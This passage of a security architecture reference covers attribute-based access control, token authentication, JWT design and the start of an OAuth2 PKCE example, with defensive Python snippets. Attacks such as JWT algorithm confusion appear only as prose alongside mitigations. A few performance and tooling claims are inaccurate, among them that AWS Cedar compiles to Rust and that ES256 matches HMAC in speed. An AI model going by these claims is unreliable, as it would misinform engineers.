        self.combined_index = {}
    
    def add_policy(self, policy_id, policy):
        # Index by resource type
        if 'resource_type' in policy.conditions:
            resource_types = policy.conditions['resource_type']
            for rt in resource_types:
                self.resource_type_index[rt].add(policy_id)
        
        # Index by action
        if 'action' in policy.conditions:
            actions = policy.conditions['action']
            for action in actions:
                self.action_index[action].add(policy_id)
    
    def get_applicable_policies(self, resource_type, action):
        candidates = (
            self.resource_type_index.get(resource_type, set()) &
            self.action_index.get(action, set())
        )
        return [self.policy_store.get(pid) for pid in candidates]
```

**Policy compilation**: Transform policies into decision trees or state machines at deployment time. **Rego compilation** generates optimized query plans.

**Partial evaluation**: Pre-compute policy subexpressions with known attributes (e.g., static resource attributes).

### Attribute Retrieval Performance

**PIP latency dominates authorization time**. Synchronous attribute fetching from multiple sources (LDAP, databases, external APIs) creates cascading delays.

**Attribute caching**: Cache subject attributes with appropriate TTL. **Negative caching** for non-existent attributes prevents repeated failed lookups.

**Attribute batching**: Batch multiple attribute requests to same PIP. GraphQL or custom batch APIs reduce round trips.

**Asynchronous attribute loading**: Fetch optional attributes asynchronously; make decision with available attributes under deadline.

```python
# Pattern: Async attribute retrieval with timeout
async def get_authorization_context(subject_id, resource_id, timeout=100):
    tasks = [
        fetch_subject_attributes(subject_id),
        fetch_resource_attributes(resource_id),
        fetch_environment_attributes()
    ]
    
    done, pending = await asyncio.wait(
        tasks,
        timeout=timeout/1000,
        return_when=asyncio.ALL_COMPLETED
    )
    
    # Cancel pending tasks
    for task in pending:
        task.cancel()
    
    # Merge completed attributes, use defaults for missing
    context = {}
    for task in done:
        context.update(task.result())
    
    return context
```

### Policy Testing and Validation

**Policy conflicts**: Multiple policies may produce contradictory decisions. Requires **conflict detection** through static analysis or exhaustive enumeration.

**Coverage analysis**: Identify unreachable policies or attribute combinations never exercised. Generate test cases for combinatorial attribute spaces.

**Property-based testing**: Verify invariants hold across policy changes (e.g., "admins always have access", "no cross-department data access").

```python
# Pattern: Policy conflict detection
def detect_conflicts(policies):
    conflicts = []
    for i, p1 in enumerate(policies):
        for p2 in policies[i+1:]:
            if overlapping_conditions(p1, p2):
                if p1.effect != p2.effect:
                    conflicts.append((p1.id, p2.id, compute_overlap(p1, p2)))
    return conflicts

def overlapping_conditions(p1, p2):
    # Check if attribute constraints can simultaneously satisfy
    for attr in set(p1.conditions.keys()) & set(p2.conditions.keys()):
        if not sets_intersect(p1.conditions[attr], p2.conditions[attr]):
            return False
    return True
```

**Formal verification**: Tools like **Amazon Cedar Validator** use SMT solvers to prove policy properties. Computationally expensive; limited to bounded attribute domains.

### Delegation and Administrative Policies

**Administrative ABAC**: Policies governing who can create/modify policies. Meta-policy creates complexity explosion if not carefully constrained.

**Attribute-based delegation**: Delegate authority based on attributes (e.g., "managers can approve requests from their department"). Requires **delegation depth limits** to prevent infinite chains.

**Revocation propagation**: When delegating authority is revoked, all delegated permissions must cascade revoke. Requires **delegation graph tracking**.

```python
# Anti-pattern: Unbounded delegation depth
def can_delegate(delegator, delegatee, permission):
    return delegator.role == "manager"  # No depth check

# Correct: Delegation with depth limit and audit trail
class DelegationManager:
    def delegate(self, delegator_id, delegatee_id, permission, max_depth=3):
        chain = self.get_delegation_chain(delegator_id, permission)
        
        if len(chain) >= max_depth:
            raise DelegationDepthExceeded(f"Chain length {len(chain)} exceeds max {max_depth}")
        
        delegation = {
            'delegator': delegator_id,
            'delegatee': delegatee_id,
            'permission': permission,
            'chain': chain + [delegator_id],
            'created_at': time.time(),
            'expires_at': time.time() + 86400
        }
        
        self.delegation_store.save(delegation)
        self.audit_log.record('delegation_created', delegation)
```

### Attribute Consistency and Updates

**Eventual consistency**: Attribute changes propagate asynchronously. **Authorization decisions may use stale attributes** until propagation completes.

**Read-your-writes consistency**: After attribute update, subject's own requests must see updated attributes. Requires **session affinity** or **cache invalidation**.

**Causal consistency**: If user B sees user A's attribute change, user B must see all prior changes to A. Requires **vector clocks** or **logical timestamps**.

```python
# Pattern: Attribute update with cache invalidation
def update_subject_attribute(subject_id, attribute, new_value):
    # Update authoritative store
    version = self.identity_store.update(subject_id, attribute, new_value)
    
    # Invalidate caches
    cache_keys = [
        f"subject:{subject_id}",
        f"subject:{subject_id}:attr:{attribute}"
    ]
    
    for key in cache_keys:
        self.cache.delete(key)
    
    # Publish change event for distributed cache invalidation
    self.event_bus.publish('attribute_changed', {
        'subject_id': subject_id,
        'attribute': attribute,
        'version': version,
        'timestamp': time.time()
    })
```

### Dynamic Attribute Computation

**Derived attributes**: Computed from base attributes (e.g., `risk_score` from `login_failures + device_trust + geo_anomaly`). Requires **deterministic computation** and **caching strategy**.

**Contextual attributes**: Depend on request context (e.g., `data_accessed_today` requires querying audit logs). High latency; requires **aggressive caching** or **approximate computation**.

**Time-based attributes**: Attributes valid only during specific periods (e.g., `on_call_engineer`). Requires **temporal policy evaluation** with clock skew handling.

```python
# Pattern: Derived attribute computation with memoization
class DerivedAttributeProvider:
    def __init__(self):
        self.cache = TTLCache(maxsize=10000, ttl=60)
    
    @cached(cache=attrgetter('cache'))
    def compute_risk_score(self, subject_id, context):
        base_attrs = self.get_base_attributes(subject_id)
        
        risk_factors = [
            self.login_failure_score(subject_id),
            self.device_trust_score(context.device_id),
            self.geo_anomaly_score(subject_id, context.ip_address),
            self.time_anomaly_score(subject_id, context.timestamp)
        ]
        
        return sum(risk_factors) / len(risk_factors)
```

### Performance Optimization Strategies

**Policy decision caching**: Cache authorization decisions with composite key `(subject, resource, action, environment_hash)`. **Invalidation challenge**: determining when cached decisions become stale.

**Partial policy evaluation**: Evaluate static policy portions once; re-evaluate only dynamic portions per request.

**Decision pre-computation**: For finite resource spaces, pre-compute authorization matrix. Effective for APIs with enumerable endpoints.

```python
# Pattern: Authorization decision caching with selective invalidation
class AuthorizationCache:
    def get_decision(self, subject_id, resource_id, action, environment):
        # Hash environment attributes affecting decision
        env_hash = self.hash_relevant_environment(environment)
        cache_key = f"authz:{subject_id}:{resource_id}:{action}:{env_hash}"
        
        cached = self.cache.get(cache_key)
        if cached:
            # Verify cached decision hasn't been invalidated
            if not self.is_invalidated(cached['version']):
                return cached['decision']
        
        decision = self.pdp.evaluate(subject_id, resource_id, action, environment)
        
        self.cache.set(cache_key, {
            'decision': decision,
            'version': self.get_policy_version(),
            'timestamp': time.time()
        }, ttl=self.compute_ttl(environment))
        
        return decision
    
    def hash_relevant_environment(self, environment):
        # Include only attributes that affect policy decisions
        relevant = {k: v for k, v in environment.items() 
                   if k in self.policy_analyzer.get_used_attributes()}
        return hashlib.sha256(json.dumps(relevant, sort_keys=True).encode()).hexdigest()
```

**Policy compilation**: Transform high-level policies into optimized bytecode or native code. **AWS Cedar** compiles to Rust for performance.

**Attribute prefetching**: Predictively fetch attributes for likely authorization requests. ML models predict next resource access patterns.

### Multi-Tenancy and Isolation

**Tenant attribute**: `tenant_id` as mandatory attribute in all policies. **Missing tenant checks** cause cross-tenant data leaks.

**Policy namespacing**: Isolate tenant policies to prevent interference. Requires **policy ID collision prevention** across tenants.

**Attribute isolation**: Ensure PIP cannot fetch attributes from other tenants. **PIP must enforce tenant boundary**.

```python
# Anti-pattern: Missing tenant isolation
def authorize(self, subject_id, resource_id, action):
    policy = self.get_policy(resource_id)
    return self.evaluate(policy, subject_id, resource_id, action)

# Correct: Explicit tenant isolation at all layers
def authorize(self, tenant_id, subject_id, resource_id, action):
    # Validate subject belongs to tenant
    if not self.validate_tenant_membership(tenant_id, subject_id):
        raise UnauthorizedError("Subject not in tenant")
    
    # Validate resource belongs to tenant
    resource = self.resource_store.get(resource_id)
    if resource.tenant_id != tenant_id:
        raise UnauthorizedError("Resource not in tenant")
    
    # Retrieve tenant-scoped policies
    policies = self.policy_store.get_tenant_policies(tenant_id)
    
    return self.evaluate(policies, subject_id, resource_id, action)
```

### Audit and Compliance

**Decision logging**: Record all authorization decisions with full context for compliance (GDPR, HIPAA, SOC2). **Log volume** requires efficient storage and query optimization.

**Explainability**: Provide justification for authorization decisions. Requires **policy trace** showing which rules matched/failed.

**Policy change audit**: Track all policy modifications with author, timestamp, approval chain. **Policy versioning** enables rollback and temporal queries.

```python
# Pattern: Comprehensive authorization audit logging
class AuditLogger:
    def log_authorization(self, decision_context, decision, policy_trace):
        audit_entry = {
            'timestamp': time.time(),
            'decision': decision.effect,
            'subject': {
                'id': decision_context.subject_id,
                'attributes': self.sanitize_sensitive_attrs(decision_context.subject_attrs)
            },
            'resource': {
                'id': decision_context.resource_id,
                'type': decision_context.resource_type
            },
            'action': decision_context.action,
            'policies_evaluated': [
                {
                    'policy_id': p.id,
                    'version': p.version,
                    'matched': p.matched,
                    'effect': p.effect
                }
                for p in policy_trace
            ],
            'evaluation_time_ms': decision.evaluation_time,
            'ip_address': decision_context.ip_address,
            'user_agent': decision_context.user_agent
        }
        
        self.audit_store.write(audit_entry)
        
        if decision.effect == 'deny':
            self.alert_on_anomalous_denial(audit_entry)
```

### Anti-Patterns

**Attribute explosion**: Creating fine-grained attributes for every possible condition (e.g., `can_access_document_123`). Use parameterized policies instead.

**Policy per resource**: Creating individual policies per resource instance instead of generalized policies. Leads to millions of policies; unmanageable.

**Synchronous external calls in policy evaluation**: Calling external APIs during PDP evaluation. Introduces latency and availability dependencies. Fetch attributes before PDP invocation.

**Ignoring negative authorization**: Only checking for permits, not explicit denies. Violates defense-in-depth; bypassed by attribute manipulation.

**Hardcoded attribute values in code**: Embedding authorization logic in application code instead of centralized policies. Defeats ABAC benefits; creates scattered authorization logic.

**Overly complex policies**: Policies with deeply nested conditions and boolean logic. Reduces comprehensibility and testability. Split into multiple simpler policies.

**Missing attribute validation**: Accepting user-provided attributes without verification. Enables privilege escalation. Always fetch attributes from authoritative sources.

### Integration Patterns

**API Gateway integration**: PEP at gateway layer intercepts requests before reaching backend services. **Token enrichment** embeds authorization decision in JWT for downstream services.

**Sidecar pattern**: PEP deployed as sidecar container alongside application pods. Provides consistent enforcement without application changes.

**Library integration**: Embed PEP as application library. Lowest latency but requires code integration in all services.

**Distributed tracing integration**: Inject authorization span into distributed traces. Enables correlation of authorization failures with request flows.

Related topics: Policy-based access control (PBAC), relationship-based access control (ReBAC), Zanzibar-inspired authorization systems, JWT attribute claims, OAuth2 token introspection, SAML attribute assertions.

---

## Token-Based Authentication

### Architecture and Token Lifecycle

Token-based authentication decouples user identity verification from session state storage on the server. Client obtains a token after successful credential verification, presents token with subsequent requests. Server validates token cryptographic signature and embedded claims without database lookup. Token lifecycle: issuance → storage → transmission → validation → refresh/revocation → expiration.

**Stateless vs. Stateful Tokens:** Stateless tokens (JWT) encode all necessary information; validation requires only cryptographic verification. Stateful tokens (opaque identifiers) require server-side lookup in session store, token registry, or database. Stateless tokens eliminate database round-trip but sacrifice instant revocation capability without additional infrastructure.

### JWT Structure and Security Implications

JWT comprises three base64url-encoded segments: header, payload, signature, separated by periods. Header specifies algorithm and token type. Payload contains claims (issuer, subject, expiration, custom data). Signature validates integrity using secret key (HMAC) or private key (RSA, ECDSA).

**Critical Implementation Requirements:**

**Algorithm Confusion Attacks:** Header's `alg` field specifies signature algorithm. Attacker modifies `alg` from RS256 (RSA public key verification) to HS256 (HMAC symmetric key), using server's public RSA key as HMAC secret. Server inadvertently validates token using public key as symmetric secret. Mitigation: explicitly whitelist allowed algorithms in validation logic, reject tokens with unexpected algorithms. Never trust `alg` field without validation.

**None Algorithm Vulnerability:** JWT specification includes `alg: none` for unsecured tokens. Libraries accepting `none` without explicit configuration allow signature bypass—attacker removes signature segment, sets `alg: none`. Mitigation: explicitly disable `none` algorithm in all JWT libraries. Never use `none` in production systems.

**Signature Verification Before Claims Extraction:** Parse and verify signature before accessing claims. Extracting claims from unverified tokens exposes application logic to attacker-controlled data. Timing attacks possible if claims processing occurs before signature validation.

### Token Expiration and Validity Windows

**Access Token Lifespan:** Short-lived (5-15 minutes) reduces exposure window if compromised. Longer lifespans (hours) reduce refresh overhead but increase security risk. Mobile applications with intermittent connectivity require longer access token lifespans (1 hour+) balanced against refresh token availability.

**Refresh Token Lifespan:** Long-lived (days to months) enables seamless user experience. One-time use refresh tokens (rotation on each refresh) limit replay attack window. Absolute expiration (30 days from issuance) forces re-authentication regardless of activity. Sliding expiration (extends on use) maintains indefinite sessions for active users but complicates account security policies.

**Clock Skew Tolerance:** Distributed systems exhibit clock drift between token issuer and validator. Strict timestamp validation rejects valid tokens due to millisecond differences. Industry practice: 60-120 second clock skew tolerance using `nbf` (not before) and `exp` (expiration) claim leeway. Excessive tolerance (5+ minutes) weakens expiration enforcement.

### Token Storage Security

**Browser Environment:** localStorage vulnerable to XSS—JavaScript access permits token exfiltration. sessionStorage provides same-origin isolation but remains XSS-vulnerable. httpOnly cookies inaccessible to JavaScript, mitigates XSS risk but introduces CSRF vulnerability requiring additional protection (SameSite attribute, CSRF tokens). Secure attribute mandatory to enforce HTTPS-only transmission.

**In-Memory Storage:** SPA frameworks storing tokens in JavaScript closures or component state lose tokens on page reload, forcing re-authentication. Balances security (no persistent storage) against user experience degradation.

**Mobile Applications:** iOS Keychain and Android Keystore provide hardware-backed encryption and access control. Tokens stored in shared preferences or unencrypted files vulnerable to rooted/jailbroken device access and backup extraction. Biometric authentication gates token access adds defense layer.

### Token Transmission Mechanisms

**Authorization Header:** `Authorization: Bearer <token>` standard for API requests. CORS preflight requests (OPTIONS) must not require authentication—server responds to preflight without token validation, actual request includes token. Misconfigured CORS rejecting preflight requests breaks authenticated cross-origin requests.

**Cookie-Based Transmission:** Server sets httpOnly cookie containing token. Browser automatically includes cookie in same-origin requests. Requires SameSite attribute configuration: Strict (cookies only on same-site navigation), Lax (cookies on top-level navigation), None (requires Secure attribute, enables cross-site requests). SameSite=None with Secure=true necessary for legitimate cross-domain authentication flows (federated identity).

**URL Parameters:** Embedding tokens in query strings (`/api/data?token=xyz`) exposes tokens in server logs, browser history, referrer headers, analytics systems. Acceptable only for one-time-use tokens (email verification, password reset) with short expiration (<5 minutes).

### Token Revocation Strategies

**Deny List (Blacklist):** Store revoked token identifiers (JTI claim) in fast-access data store (Redis). Validate token signature, check JTI against deny list before granting access. Deny list grows unbounded without expiration pruning—remove entries when token's original expiration time passes. High-throughput systems (10k+ req/s) face latency penalties from deny list lookup; require sub-millisecond cache access.

**Allow List (Whitelist):** Store only valid active tokens. Revocation removes token from allow list. Converts stateless tokens into stateful—contradicts JWT's stateless design. Appropriate for high-security scenarios requiring instant revocation (admin privilege escalation, compromised accounts).

**Token Versioning:** Include version claim in token payload. Maintain per-user token version in database. Increment version on password change, permission modification, or explicit logout. Validation rejects tokens with version mismatch. Single database lookup per request but significantly cheaper than full token registry maintenance.

**Short Expiration + Refresh:** Access tokens expire quickly (5 minutes), refresh tokens enable transparent renewal. Revoke refresh tokens only—access tokens naturally expire. Delayed revocation (maximum 5-minute exposure) insufficient for real-time security requirements (compromised credentials, privilege changes).

### Refresh Token Security

**Rotation (One-Time Use):** Each refresh operation issues new access token and new refresh token, invalidating previous refresh token. Limits replay attack window—stolen refresh token usable once before legitimate refresh invalidates it. Detection: if invalidated refresh token presented, revoke entire token family (all tokens issued from original authentication).

**Token Family Tracking:** Associate all refresh tokens issued from single authentication session. Store family identifier in database. Suspicious activity (concurrent refresh attempts, invalidated token reuse) triggers family-wide revocation. Requires database schema supporting parent-child token relationships.

**Refresh Token Rotation Race Condition:** Client network failure after server issues new token pair but before client receives response. Client retries with old refresh token (now invalidated). Mitigation: grace period allowing old refresh token for 30-60 seconds post-rotation, or reuse detection logic distinguishing legitimate retry from replay attack.

### Multi-Factor Authentication and Token Claims

**Step-Up Authentication:** Initial login issues token with standard claims. Sensitive operations (financial transactions, account settings) require additional authentication factor. Token includes `acr` (authentication context class reference) claim indicating authentication strength. High-security endpoints reject tokens without elevated `acr` value, forcing step-up flow.

**Scope and Permission Claims:** Embed user permissions/roles in token payload. Reduces database lookups but creates staleness—permission changes not reflected until token renewal. Maximum staleness equals access token lifetime. Alternative: embed only user identifier, fetch permissions on each request (restores stateful pattern). Hybrid: cache permission lookups with short TTL (60 seconds).

### Token Size and Performance

**JWT Bloat:** Base64 encoding increases size ~33%. Large claim sets (embedded permissions, user metadata) create multi-kilobyte tokens. HTTP header size limits (8KB typical) constrain token size. CDN and proxies may reject oversized headers. Mobile networks amplify transmission overhead—1KB token on every request consumes bandwidth.

**Size Reduction Techniques:** Abbreviate claim names (`sub` vs. `subject`). Remove optional claims. Use claim compression (non-standard, requires custom implementation). Store complex data server-side, embed only reference identifier. Consider opaque tokens for scenarios requiring extensive embedded data.

### Cross-Service Authentication

**Audience Claim Validation:** `aud` claim specifies intended token recipient. Service A issues token for Service B, embedding `aud: "service-b"`. Service B validates `aud` matches its identifier, rejects tokens intended for other services. Prevents token reuse across service boundaries—compromised Service C cannot use tokens issued for Service B.

**Token Exchange (RFC 8693):** Client obtains token from Authorization Server, exchanges for service-specific token. Delegation scenario: user authenticates, acquires token for Service A, Service A exchanges user token for token granting Service A access to Service B on user's behalf. Subject token (original) and actor token (delegated) distinguish impersonation from delegation.

**Service-to-Service Authentication:** Backend services authenticate using client credentials flow (OAuth 2.0). Service uses client ID and secret to obtain token from authorization server. Token includes service identity in `sub` claim, scopes defining permitted operations. Secrets stored in secure vaults (HashiCorp Vault, AWS Secrets Manager), rotated regularly (90 days).

### Token Binding and Proof-of-Possession

**Standard JWT:** Bearer token—possession proves authentication. Stolen token fully compromises account until expiration. Token binding cryptographically ties token to TLS connection, preventing token reuse on different connection.

**Proof-of-Possession Tokens:** Client generates public-private key pair, includes public key hash in token request. Authorization server embeds public key hash in token's `cnf` (confirmation) claim. Client signs requests using private key. Server validates signature using public key from token. Stolen token useless without corresponding private key. DPoP (RFC 9449) standardizes PoP for OAuth 2.0.

### Rate Limiting and Token-Based Abuse

**Token-Based Rate Limiting:** Rate limit by `sub` (user identifier) claim extracted from validated token. Prevents single user from exhausting API quota through multiple clients. Requires token validation before rate limit check—expensive operation repeated for rate-limited requests.

**Automated Attack Detection:** Monitor token issuance patterns—sudden spike in token requests from single IP suggests credential stuffing. Failed validation attempts (expired tokens, invalid signatures) indicate token replay attacks. Geographic anomalies (token issued in US, used from Asia 5 minutes later) trigger MFA challenges.

### Token Payload Encryption

**JWE (JSON Web Encryption):** Encrypts JWT payload, preventing claim inspection. Structure: header, encrypted key, initialization vector, ciphertext, authentication tag. Use case: tokens traversing untrusted intermediaries (CDNs, third-party services) while protecting sensitive claims (PII, financial data).

**Performance Cost:** Encryption/decryption overhead (10-100x slower than signature-only JWT depending on algorithm). Key management complexity—recipients require decryption keys. Nested JWT (signed then encrypted) combines integrity and confidentiality at additional processing cost.

### Standards Compliance and Algorithm Selection

**HMAC (HS256, HS384, HS512):** Symmetric signing using shared secret. Fastest validation. Secret distribution problem—all validators possess signing capability. Single secret compromise affects entire system. Appropriate for single-service architectures with centralized validation.

**RSA (RS256, RS384, RS512):** Asymmetric signing using private key, validation using public key. Public key distribution safe—validators cannot forge tokens. Large signature size (256+ bytes). Slower signing/verification (milliseconds vs. microseconds for HMAC). Key size minimum: 2048 bits, 3072+ bits recommended.

**ECDSA (ES256, ES384, ES512):** Asymmetric signing with smaller keys and signatures than RSA. ES256 (P-256 curve) provides 128-bit security with 64-byte signatures. Faster than RSA, comparable to HMAC. Library support inconsistent—verify implementation quality, avoid weak RNG in signature generation.

**EdDSA (Ed25519):** Modern elliptic curve signature scheme. Deterministic signatures eliminate RNG vulnerabilities. Fastest asymmetric algorithm, smaller signatures than ECDSA. Limited library support in legacy systems. Recommended for new implementations.

### Token Validation Performance Optimization

**Signature Caching:** Cache validation results keyed by token hash. Identical token presented multiple times validated once, subsequent requests use cached result. Cache TTL must not exceed token expiration time. Risk: validated token revoked but cache serves stale positive result. Appropriate only with short-lived tokens (<5 minutes) and low revocation frequency.

**Public Key Caching:** JWKS (JSON Web Key Set) endpoint provides issuer's public keys. Fetch and cache keys, refresh periodically (1-24 hours) or on validation failure (unknown key ID). Key rotation: issuer publishes new key before use, removes old key after grace period. Validator caches multiple keys during rotation window.

**Validation Pipeline Optimization:** Short-circuit validation on clear failures—check expiration before signature verification. Expired token fails immediately without expensive cryptographic operations. Order: basic format validation → expiration → audience → signature → custom claims.

### Migration and Backwards Compatibility

**Dual Token Support:** Transition period supporting legacy session-based authentication and new token-based system. Middleware checks for both session cookie and Authorization header. Gradual client migration without forced downtime. Risk: dual code paths increase attack surface and complexity.

**Token Format Versioning:** Include `ver` claim indicating token schema version. Breaking changes increment version. Validators support multiple versions during transition. Version 1 tokens accepted until deprecation deadline, version 2 introduced in parallel. Explicit version rejection after cutoff date.

### Compliance and Legal Requirements

**PII in Tokens:** GDPR restricts PII storage and transmission. JWTs containing email, name, or identifiers traversing network potentially violate regulations depending on legal basis. Prefer opaque tokens or minimal claims (only user ID) for EU users. Data residency requirements may prohibit token validation in specific geographic regions.

**Audit Trail:** Token issuance, validation, and revocation events logged for compliance. Logs include timestamp, user identifier, IP address, user agent, token identifier (JTI). Retention periods vary by regulation (HIPAA: 6 years, SOX: 7 years). Sanitize logs to prevent token leakage—log token hash, not token value.

### Related Topics

OAuth 2.0 flows and grant types, OpenID Connect authentication layer, Session management patterns, CSRF protection mechanisms, CORS configuration for authenticated requests, Public Key Infrastructure (PKI) and certificate management, Cryptographic algorithm selection and key management, API gateway authentication, Zero Trust architecture, Identity federation and SAML

---

## JWT Pattern

JSON Web Tokens (JWT) provide stateless authentication and authorization through cryptographically signed, self-contained tokens that encode claims about subjects without requiring server-side session storage. The pattern trades increased token size and computational overhead for horizontal scalability and reduced coupling between authentication and resource services.

### Token Structure and Encoding

**Header Component** Specifies cryptographic algorithm (`alg`) and token type (`typ`). Critical security requirement: validate `alg` matches expected signing method to prevent algorithm substitution attacks. Reject tokens with `alg: none` unless explicitly operating in development modes with conscious security trade-offs. Include `kid` (key ID) when rotating signing keys to identify which key signed the token without trial-and-error verification attempts.

**Payload Component** Contains claims (registered, public, private). Registered claims include `iss` (issuer), `sub` (subject), `aud` (audience), `exp` (expiration), `nbf` (not before), `iat` (issued at), `jti` (JWT ID). Avoid embedding sensitive data (passwords, financial details, PII) as JWTs are base64-encoded, not encrypted—anyone intercepting the token can decode and read payload contents. Size constraint: keep total token under 4KB to prevent HTTP header size limits and cookie storage issues.

**Signature Component** Computed as `HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)` for symmetric algorithms or `RS256/ES256` signatures for asymmetric cryptography. Signature verification ensures token integrity and authenticity but does not provide confidentiality.

### Signing Algorithm Selection

**HS256 (HMAC-SHA256)** Symmetric key algorithm requiring shared secret between issuer and verifier. Suitable for monolithic architectures or tightly coupled microservices with secure key distribution channels. Vulnerability: compromise of any service possessing the secret enables token forgery across entire system. Key rotation requires synchronized updates across all services simultaneously, creating deployment coordination overhead.

**RS256 (RSA-SHA256)** Asymmetric algorithm where issuer signs with private key, verifiers validate with public key. Enables zero-trust architectures where resource services validate tokens without possessing signing capabilities. Public key distribution through JWKS (JSON Web Key Set) endpoints enables dynamic key rotation without service restarts. Computational cost: RSA operations are 10-100x slower than HMAC; acceptable for typical authentication flows but problematic for high-frequency token verification (>10k/sec per instance).

**ES256 (ECDSA-SHA256)** Elliptic curve cryptography providing equivalent security to RSA with smaller key sizes (256-bit ECDSA ≈ 3072-bit RSA) and faster signature generation/verification. Preferred for performance-critical systems and mobile clients where token size matters. Implementation caveat: ECDSA signatures are non-deterministic, producing different signatures for identical inputs, complicating certain caching strategies.

### Anti-Patterns

**Storing Sensitive Data in Payload** JWTs are signed but not encrypted. Base64 encoding provides zero confidentiality. Embedding passwords, credit card numbers, social security numbers, or medical records violates data protection regulations and creates credential exposure risk. Use opaque reference tokens or JWE (JSON Web Encryption) if payload confidentiality is required.

**Unbounded or Excessive Expiration Times** Setting `exp` to weeks/months ahead creates irrevocable tokens that remain valid even after account compromise, password changes, or permission revocations. Standard practice: access tokens expire within 15-60 minutes, refresh tokens within 1-14 days based on risk tolerance. Longer durations necessitate token revocation mechanisms, negating statelessness benefits.

**No Audience Validation** Omitting `aud` claim validation allows token reuse across unintended services. Attacker obtaining token for Service A can replay it against Service B if both accept tokens from same issuer without audience verification. Implement strict audience checking matching expected service identifier.

**Accepting Algorithm 'none'** Historical vulnerability where libraries honored `alg: none` allowing unsigned tokens. Modern libraries disable this by default, but misconfigured custom implementations remain vulnerable. Explicitly whitelist acceptable algorithms (`RS256`, `ES256`) and reject tokens with unexpected `alg` values before verification attempts.

**Client-Side Token Storage in localStorage** Storing JWTs in `localStorage` or `sessionStorage` exposes tokens to XSS attacks—any JavaScript execution (malicious scripts, compromised dependencies, browser extensions) can exfiltrate tokens. Use `httpOnly`, `Secure`, `SameSite=Strict` cookies for web applications. Mobile apps should use platform-specific secure storage (iOS Keychain, Android Keystore).

**No Token Revocation Strategy** Pure stateless JWTs cannot be revoked before expiration. Strategies for handling compromised tokens: maintain blacklist/denylist of revoked `jti` claims (reintroduces state), implement short expiration with refresh token rotation, use token introspection endpoints, or hybrid approaches with Redis-backed revocation lists expiring at token `exp` time.

### Edge Cases and Security Considerations

**Clock Skew** Distributed systems have clock drift. `exp` and `nbf` validation fails when verifier clock differs from issuer. Implement clock skew tolerance (typically 60-300 seconds) allowing tokens to be accepted slightly before `nbf` or after `exp`. Configure NTP synchronization on all systems; monitor drift exceeding acceptable thresholds.

**Key Rotation** Implement graceful key rotation supporting overlapping validity periods. Maintain multiple active public keys in JWKS endpoint during rotation window (typically 24-72 hours). New tokens sign with new key (`kid: new-key-id`), but verifiers accept both old and new keys. After rotation window, remove old key from JWKS. Track token signature verification failures by `kid` to detect rotation issues.

**Token Replay Attacks** JWTs remain valid until expiration even after use. For sensitive operations (financial transactions, password resets), implement additional safeguards: short-lived single-use tokens with `jti` tracking, challenge-response flows, or transaction-specific nonces. HTTPS transport is mandatory—never transmit JWTs over unencrypted channels.

**JWT Confusion Attacks** Attacker modifies `alg` from `RS256` to `HS256` and re-signs token using public key as HMAC secret. Verifier treating public key as symmetric secret validates malicious token. Mitigation: explicitly specify expected algorithm during verification; never derive algorithm from token header alone.

**Sub-Claim Injection** Attacker manipulating `sub` claim to impersonate different users. Validation requirements: verify `sub` matches authenticated session before token issuance, validate `sub` format (UUID, numeric ID) to prevent injection attacks, cross-reference `sub` with request context to detect privilege escalation attempts.

### Refresh Token Patterns

**Refresh Token Rotation** Issue new refresh token with each access token renewal, immediately invalidating previous refresh token. Detects token theft: if revoked refresh token is presented, both legitimate and stolen token lineages are terminated. Implementation requires stateful tracking of active refresh token families with session identifiers.

**Sliding Sessions** Extend refresh token expiration on each use, maintaining long-lived sessions for active users while expiring inactive sessions. Configure maximum absolute session duration (e.g., 90 days regardless of activity) to enforce periodic re-authentication.

**Refresh Token Binding** Cryptographically bind refresh tokens to specific devices/clients using device fingerprints, client certificates, or proof-of-possession keys. Prevents stolen refresh tokens from functioning on attacker-controlled devices. Increases implementation complexity; requires client-side cryptographic capabilities.

### Distributed Systems Considerations

**Service-to-Service Communication** Use asymmetric algorithms allowing services to verify without signing capabilities. Implement separate token scopes for service accounts distinct from user tokens. Consider mTLS as alternative providing transport-layer authentication without token parsing overhead.

**Token Size vs. Claims Trade-off** Each additional claim increases token size linearly. HTTP headers exceeding 8KB trigger 431 errors in many proxies/servers. Strategies: minimize custom claims, use claim abbreviations (`usr` vs. `username`), reference external authorization data through `sub` lookup rather than embedding permissions in token, implement compressed JWT (JWT with DEFLATE compression).

**JWKS Caching and Distribution** Cache JWKS responses with TTL matching key rotation frequency (typically 1-24 hours). Implement fallback to direct JWKS fetch on signature verification failures with unknown `kid`. Use CDN or edge caching for JWKS endpoints serving high-volume verification traffic. Monitor JWKS endpoint availability as single point of failure for token verification.

### Observability and Monitoring

Instrument JWT operations with:

- Token issuance rate and latency percentiles segmented by grant type
- Verification failure rates categorized by failure reason (expired, invalid signature, missing claims, audience mismatch)
- Token size distribution histograms
- `kid` usage distribution to validate key rotation effectiveness
- Time-to-expiration distribution for issued tokens
- Refresh token usage patterns (refresh frequency, rotation success rates)

Alert on anomalies: sudden verification failure spikes (key rotation issues, clock skew), abnormal token sizes (payload injection attempts), refresh token reuse patterns (theft indicators).

### Technology-Specific Implementations

**Java (jose4j, nimbus-jose-jwt)**: Configure `AlgorithmConstraints` restricting acceptable algorithms. Use `JwtConsumer` with explicit audience, issuer, and clock skew validators. Leverage built-in key caching for JWKS retrieval.

**Node.js (jsonwebtoken, jose)**: Specify algorithm explicitly in `verify()` options. Implement custom claim validators for application-specific requirements. Use async verification methods to prevent event loop blocking.

**Python (PyJWT, python-jose)**: Set `algorithms` parameter as whitelist during decode. Configure `leeway` for clock skew tolerance. Use `options` dictionary to enforce required claims presence.

**.NET (System.IdentityModel.Tokens.Jwt)**: Configure `TokenValidationParameters` with `ValidateIssuer`, `ValidateAudience`, `ValidateLifetime`. Implement custom `ISecurityTokenValidator` for specialized validation logic.

**Related Topics**: OAuth 2.0 authorization flows, PASETO (Platform-Agnostic Security Tokens), certificate-based authentication, session management patterns, zero-trust architecture, API gateway authentication patterns, token introspection endpoints.

---

## OAuth2 Patterns

### Authorization Code Flow with PKCE

PKCE (Proof Key for Code Exchange, RFC 7636) mitigates authorization code interception attacks in public clients and is now recommended for all OAuth2 clients including confidential clients.

```python
import hashlib
import base64
import secrets

def generate_pkce_pair():
    """Generate code_verifier and code_challenge"""
    # code_verifier: 43-128 character random string
    code_verifier = base64.urlsafe_b64encode(
        secrets.token_bytes(32)
    ).decode('utf-8').rstrip('=')
    
    # code_challenge: SHA256 hash of verifier
    challenge_bytes = hashlib.sha256(code_verifier.encode('utf-8')).digest()
    code_challenge = base64.urlsafe_b64encode(challenge_bytes).decode('utf-8').rstrip('=')
    
    return code_verifier, code_challenge

# Authorization request
